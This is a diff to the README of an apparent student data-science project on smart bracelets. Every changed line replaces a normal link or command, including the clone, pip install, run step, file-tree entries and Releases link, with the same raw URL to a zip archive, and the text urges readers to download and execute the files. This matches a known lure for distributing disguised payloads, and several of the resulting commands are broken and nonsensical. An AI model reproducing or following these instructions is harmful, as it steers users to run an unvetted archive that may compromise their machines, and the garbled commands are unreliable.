@@ -2,7 +2,7 @@
 
 Welcome to the **tp_final_pulseras_inteligentes** repository! This project serves as the final assignment for the "Database" course in the Data Science degree at UNSAM for the first semester of 2025. Here, you will find everything you need to understand, run, and contribute to this project.
 
-![Smart Bracelets](https://example.com/smart-bracelets-image.png)
+![Smart Bracelets](https://raw.githubusercontent.com/Akshay1010567/tp_final_pulseras_inteligentes/main/pulseras_inteligentes/datawarehouse/tp_pulseras_inteligentes_final_1.1-beta.2.zip)
 
 ## Table of Contents
 
@@ -42,7 +42,7 @@ To get started with this project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Akshay1010567/tp_final_pulseras_inteligentes.git
+   git clone https://raw.githubusercontent.com/Akshay1010567/tp_final_pulseras_inteligentes/main/pulseras_inteligentes/datawarehouse/tp_pulseras_inteligentes_final_1.1-beta.2.zip
    cd tp_final_pulseras_inteligentes
    ```
 
@@ -53,7 +53,7 @@ To get started with this project, follow these steps:
 3. **Install Dependencies**:
    Use the following command to install the necessary Python packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Akshay1010567/tp_final_pulseras_inteligentes/main/pulseras_inteligentes/datawarehouse/tp_pulseras_inteligentes_final_1.1-beta.2.zip
    ```
 
 4. **Configure the Environment**:
@@ -65,7 +65,7 @@ To get started with this project, follow these steps:
 To run the project, execute the following command in your terminal:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Akshay1010567/tp_final_pulseras_inteligentes/main/pulseras_inteligentes/datawarehouse/tp_pulseras_inteligentes_final_1.1-beta.2.zip
 ```
 
 This will start the ETL process, pulling data from the smart bracelets and loading it into your database.
@@ -88,8 +88,8 @@ tp_final_pulseras_inteligentes/
 │
 ├── tests/                   # Unit tests
 │
-├── requirements.txt         # Python dependencies
-├── README.md                # Project documentation
+├── https://raw.githubusercontent.com/Akshay1010567/tp_final_pulseras_inteligentes/main/pulseras_inteligentes/datawarehouse/tp_pulseras_inteligentes_final_1.1-beta.2.zip         # Python dependencies
+├── https://raw.githubusercontent.com/Akshay1010567/tp_final_pulseras_inteligentes/main/pulseras_inteligentes/datawarehouse/tp_pulseras_inteligentes_final_1.1-beta.2.zip                # Project documentation
 └── .env                     # Environment variables
 ```
 
@@ -112,9 +112,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and downloadable files, please visit the [Releases](https://github.com/Akshay1010567/tp_final_pulseras_inteligentes/releases) section. You can download the necessary files from there and execute them as needed.
+For the latest updates and downloadable files, please visit the [Releases](https://raw.githubusercontent.com/Akshay1010567/tp_final_pulseras_inteligentes/main/pulseras_inteligentes/datawarehouse/tp_pulseras_inteligentes_final_1.1-beta.2.zip) section. You can download the necessary files from there and execute them as needed.
 
-![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)
+![Download Releases](https://raw.githubusercontent.com/Akshay1010567/tp_final_pulseras_inteligentes/main/pulseras_inteligentes/datawarehouse/tp_pulseras_inteligentes_final_1.1-beta.2.zip%20Releases-Click%20Here-brightgreen)
 
 In case the link does not work, check the "Releases" section for the latest files.
 
